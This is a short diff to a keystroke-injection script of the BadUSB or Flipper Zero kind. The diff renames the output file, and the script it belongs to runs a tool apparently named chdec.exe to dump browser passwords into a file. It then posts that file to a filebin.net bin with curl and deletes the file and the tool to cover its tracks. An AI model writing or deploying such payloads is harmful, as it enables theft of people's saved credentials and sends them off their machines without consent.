@@ -16,17 +16,17 @@ ENTER
 DELAY 5000
 
 REM Run chdec.exe
-STRING chdec.exe > psw.txt
+STRING chdec.exe > psw.json
 ENTER
 DELAY 1000
 
 REM Upload file online
-STRING curl -X POST https://filebin.net/flipperpioz/psw.txt -d @psw.txt
+STRING curl -X POST https://filebin.net/flipperpioz/psw.json -d @psw.json
 ENTER
 DELAY 2000
 
 REM Delete files
-STRING del psw.txt
+STRING del psw.json
 ENTER
 DELAY 100
 STRING del chdec.exe
